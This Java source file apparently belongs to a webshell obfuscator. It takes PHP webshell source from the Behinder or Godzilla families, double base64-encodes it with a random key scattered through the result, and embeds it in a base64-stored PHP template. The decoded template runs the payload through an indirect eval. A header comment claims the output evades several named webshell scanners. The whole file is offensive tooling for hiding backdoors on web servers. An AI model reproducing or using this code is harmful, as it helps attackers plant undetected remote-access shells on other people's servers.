package encode;

import application.RandomString;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Random;

public class PhpEncodeDemo5 {
    String tamplate;
    String key;
    String sourcecode;
    String encode;

    public PhpEncodeDemo5() {
    }

    public PhpEncodeDemo5(String tamplate, String key, String code) {
        this.tamplate = tamplate;
        this.key = key;
        this.sourcecode = code;
    }

    public static String GetDemotxt(){

        return "/*\n" +
                " * By: XG小刚\n" +
                " * Time: 2023-09-14_demo5\n" +
                " * Bypass: 牧云、伏魔、河马在线、河马本地(1.8.2)\n" +
                " * 需php版本 >= 8.1\n"+
                " */";
    }

    public String Run(){

        if(!sourcecode.isEmpty()){
            try {
                sourcecode = sourcecode.replace("<?php", "").replace("?>", "").trim();
                byte[] bytes = sourcecode.getBytes(StandardCharsets.UTF_8);
                String s = Base64.getEncoder().encodeToString(Base64.getEncoder().encode(bytes));
                if(this.key.equals("默认随机")){
                    this.key = RandomString.getRString(8);
                }

                StringBuilder stringBuilder = new StringBuilder(s);
                int aa = new Random().nextInt((stringBuilder.length())/2)+1;
                for (int i = aa;  i > 0; i = new Random().nextInt(i)) {
                    stringBuilder.insert(i,this.key);
                }
                s = stringBuilder.toString();


                String demo5 = "PD9waHAKCmNsYXNzIFVzZXIgewogIHB1YmxpYyBmdW5jdGlvbiBnZXRwcml2YXRlTWV0aG9kKCkgewogICAgcmV0dXJuICR0aGlzLT5wcml2YXRlTWV0aG9kKC4uLik7CiAgfQogIHByaXZhdGUgZnVuY3Rpb24gcHJpdmF0ZU1ldGhvZCgkYWVzX2RlY29kZSkgewogICAgcmV0dXJuIEBldmFsKCRhZXNfZGVjb2RlKTsKICB9Cn0KJHVzZXIgPSBuZXcgVXNlcjsKJGFlc19kZWNvZGUgPSR1c2VyLT5nZXRwcml2YXRlTWV0aG9kKCkoJwokdXNlcm5hbWUgPSBcJyRrZXkkXCc7CiRwYXNzd29yZCA9IFwnJGJhc2U2NGNvZGUkXCc7CmhlYWRlcihcJ2RkZGRkZDpcJy4kdXNlcm5hbWUpOwokYXJyID0gYXBhY2hlX3Jlc3BvbnNlX2hlYWRlcnMoKTsKJHRlbXBsYXRlX3NvdXJjZT1cJ1wnOwpmb3JlYWNoICgkYXJyIGFzICRrID0+ICR2KSB7CiAgICBpZiAoJGtbMF0gPT0gXCdkXCcgJiYgJGtbNF0gPT0gXCdkXCcpIHsKICAgICAgICAkdGVtcGxhdGVfc291cmNlID0gc3RyX3JlcGxhY2UoJHYsXCdcJywkcGFzc3dvcmQpOwogICAgfQp9CiR0ZW1wbGF0ZV9zb3VyY2UgPSBiYXNlNjRfZGVjb2RlKCR0ZW1wbGF0ZV9zb3VyY2UpOwokdGVtcGxhdGVfc291cmNlID0gYmFzZTY0X2RlY29kZSgkdGVtcGxhdGVfc291cmNlKTsKJGtleSA9IFwndGVtcGxhdGVfc291cmNlXCc7CiRhZXNfZGVjb2RlPSQka2V5OwpyZXR1cm4gJGFlc19kZWNvZGU7CicpOwokdXNlci0+Z2V0cHJpdmF0ZU1ldGhvZCgpKCRhZXNfZGVjb2RlKTsK";
                encode = new String(Base64.getDecoder().decode(demo5));

                encode = encode.replace("$key$",this.key);
                encode = encode.replace("$base64code$",s);

                return this.encode;
            }catch (Exception e){
                return "加密失败";
            }
        }else {
            return "请输入冰蝎、哥斯拉PHP源码";
        }

    }
}
